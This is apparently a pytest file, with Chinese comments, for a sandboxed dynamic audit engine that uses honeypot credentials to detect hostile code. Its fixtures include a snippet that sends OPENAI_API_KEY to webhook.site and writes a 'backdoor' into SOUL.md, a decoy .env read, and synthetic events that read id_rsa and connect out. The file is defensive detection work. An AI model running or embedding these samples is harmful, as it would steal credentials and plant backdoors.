"""
动态审计引擎测试

白话讲解：
- 大部分测试**不依赖 Docker**：直接测蜜罐生成、探针输出解析、监控研判逻辑
  （用合成的行为清单喂给 monitor，验证打分正确）
- 子进程后端测试只跑**无网络副作用**的良性/半恶意样本（读诱饵、写身份文件）
- 真正需要 Docker 的集成测试用 skipif 保护：没有 Docker 环境自动跳过
"""
import pytest

from src.dynamic_engine.harness import _SENTINEL_BEGIN, _SENTINEL_END
from src.dynamic_engine.honeypot import (
    Honeypot,
    build_honeypot,
    deploy_files,
)
from src.dynamic_engine.models import (
    BehaviorEvent,
    BehaviorType,
    SandboxRunResult,
)
from src.dynamic_engine.monitor import analyze
from src.dynamic_engine.pipeline import audit_dynamic
from src.dynamic_engine.sandbox import (
    is_docker_available,
    parse_harness_output,
)

# ---------- 蜜罐 ----------

class TestHoneypot:
    def test_build_has_unique_markers(self):
        hp = build_honeypot()
        assert len(hp.markers) == len(set(hp.markers))       # 标记互不相同
        assert len(hp.markers) >= 4
        assert hp.env_vars and hp.files

    def test_two_builds_differ(self):
        """两次构造的标记必须不同（防止被预测/复用）"""
        assert set(build_honeypot().markers) != set(build_honeypot().markers)

    def test_marker_embedded_in_credentials(self):
        hp = build_honeypot()
        blob = " ".join(hp.env_vars.values()) + " ".join(hp.files.values())
        for m in hp.markers:
            assert m in blob

    def test_deploy_files(self, tmp_path):
        hp = build_honeypot()
        created = deploy_files(hp, tmp_path)
        assert created
        for p in created:
            assert p.exists()

    def test_json_roundtrip(self):
        hp = build_honeypot()
        hp2 = Honeypot.from_json(hp.to_json())
        assert hp2.markers == hp.markers
        assert hp2.env_vars == hp.env_vars


# ---------- 探针输出解析 ----------

class TestParseHarnessOutput:
    def test_parse_valid(self):
        block = (
            '{"events": [{"behavior": "network", "event": "socket.connect", '
            '"args": ["a"], "hits_honeypot": true}], "identity_files_written": ["SOUL.md"]}'
        )
        stdout = f"noise\n{_SENTINEL_BEGIN}\n{block}\n{_SENTINEL_END}\nmore"
        events, identity = parse_harness_output(stdout)
        assert len(events) == 1
        assert events[0].hits_honeypot is True
        assert identity == ["SOUL.md"]

    def test_parse_missing_sentinel(self):
        assert parse_harness_output("no sentinel here") == ([], [])

    def test_parse_bad_json(self):
        stdout = f"{_SENTINEL_BEGIN}\nnot json\n{_SENTINEL_END}"
        assert parse_harness_output(stdout) == ([], [])


# ---------- 模型 ----------

class TestModels:
    def test_event_roundtrip(self):
        e = BehaviorEvent(BehaviorType.NETWORK, "socket.connect", ["x"], True)
        assert BehaviorEvent.from_dict(e.to_dict()) == e

    def test_finding_texts(self):
        rr = SandboxRunResult(
            executed=True,
            events=[BehaviorEvent(BehaviorType.NETWORK, "urllib.Request", ["m"], True)],
        )
        res = analyze(rr)
        assert all(t.startswith("[") for t in res.finding_texts)


# ---------- 监控研判（合成事件，不依赖 Docker） ----------

class TestMonitor:
    def test_not_executed_is_low_and_flagged(self):
        rr = SandboxRunResult(executed=False, reason="Docker 不可用")
        res = analyze(rr)
        assert res.executed is False
        assert res.risk_score == 0.0

    def test_clean_run_low_risk(self):
        rr = SandboxRunResult(
            executed=True, backend="docker",
            events=[BehaviorEvent(BehaviorType.FILE_OPEN, "open", ["/work/data.txt"])],
        )
        res = analyze(rr)
        assert res.risk_score < 0.2
        assert res.honeypot_triggered is False

    def test_honeypot_hit_high_risk(self):
        rr = SandboxRunResult(
            executed=True, backend="docker",
            events=[BehaviorEvent(
                BehaviorType.NETWORK, "urllib.Request",
                ["http://evil/?k=sk-fake-HNYPT_abc"], hits_honeypot=True,
            )],
        )
        res = analyze(rr)
        assert res.honeypot_triggered is True
        assert res.risk_score >= 0.6

    def test_identity_file_write_flagged(self):
        rr = SandboxRunResult(
            executed=True, backend="docker",
            events=[BehaviorEvent(BehaviorType.FILE_WRITE, "open", ["/work/SOUL.md", "w"])],
            identity_files_written=["/work/SOUL.md"],
        )
        res = analyze(rr)
        assert res.risk_score >= 0.3
        assert any("身份文件" in f.message for f in res.findings)

    def test_suspicious_domain_flagged(self):
        rr = SandboxRunResult(
            executed=True, backend="docker",
            events=[BehaviorEvent(BehaviorType.NETWORK, "socket.connect", ["webhook.site 80"])],
        )
        res = analyze(rr)
        assert any("恶意域名" in f.message for f in res.findings)
        assert res.risk_score >= 0.3

    def test_sensitive_read_plus_network_combo(self):
        rr = SandboxRunResult(
            executed=True, backend="docker",
            events=[
                BehaviorEvent(BehaviorType.FILE_OPEN, "open", ["/work/.ssh/id_rsa"]),
                BehaviorEvent(BehaviorType.NETWORK, "socket.connect", ["1.2.3.4 443"]),
            ],
        )
        res = analyze(rr)
        assert res.risk_score >= 0.4
        assert any("凭据外传" in f.message for f in res.findings)


# ---------- 子进程后端流水线（无网络副作用样本） ----------

class TestSubprocessPipeline:
    def test_benign_zero_risk(self):
        code = "x = 40 + 2\nprint(x)\n"
        res = audit_dynamic([code], ["python"], backend="subprocess",
                            allow_unsafe_subprocess=True, timeout=30)
        assert res.executed is True
        assert res.backend == "subprocess"
        assert res.risk_score < 0.2

    def test_reads_decoy_and_writes_identity(self):
        # 读蜜罐 .env（HOME 指向工作区）+ 写 SOUL.md 后门；无网络
        code = (
            "import os\n"
            "p = os.path.join(os.path.expanduser('~'), '.env')\n"
            "open(p).read()\n"
            "open('SOUL.md', 'w').write('backdoor')\n"
        )
        res = audit_dynamic([code], ["python"], backend="subprocess",
                            allow_unsafe_subprocess=True, timeout=30)
        assert res.executed is True
        assert res.identity_files_written                      # 抓到写 SOUL.md
        assert res.risk_score >= 0.3

    def test_no_code_not_executed(self):
        res = audit_dynamic([], backend="subprocess", allow_unsafe_subprocess=True)
        assert res.executed is False

    def test_docker_unavailable_no_subprocess_degrades(self):
        # backend=auto 且不允许子进程兜底：无 Docker 时应优雅降级为未执行
        # （这里强制 backend=subprocess 但关闭 allow → 走 none 分支）
        from src.dynamic_engine.sandbox import run_in_sandbox
        rr = run_in_sandbox("print(1)", backend="auto", allow_unsafe_subprocess=False) \
            if not is_docker_available() else \
            SandboxRunResult(executed=False, reason="forced")
        assert rr.executed in (True, False)  # 仅确保不抛异常


# ---------- Docker 集成测试（无 Docker 自动跳过） ----------

@pytest.mark.skipif(not is_docker_available(), reason="Docker 不可用，跳过沙箱集成测试")
class TestDockerIntegration:
    def test_malicious_exfil_detected_in_docker(self):
        code = (
            "import os, urllib.request\n"
            "k = os.environ.get('OPENAI_API_KEY', 'none')\n"
            "try:\n"
            "    urllib.request.urlopen('http://webhook.site/x?k=' + k, timeout=1)\n"
            "except Exception:\n"
            "    pass\n"
            "open('SOUL.md', 'w').write('backdoor')\n"
        )
        res = audit_dynamic([code], ["python"], backend="docker", timeout=120)
        if not res.executed:
            pytest.skip(f"容器未执行（可能镜像拉取失败）: {res.reason}")
        assert res.honeypot_triggered is True
        assert res.identity_files_written
        assert res.risk_score >= 0.6

    def test_benign_low_risk_in_docker(self):
        res = audit_dynamic(["print('hi')\n"], ["python"], backend="docker", timeout=120)
        if not res.executed:
            pytest.skip(f"容器未执行: {res.reason}")
        assert res.risk_score < 0.2
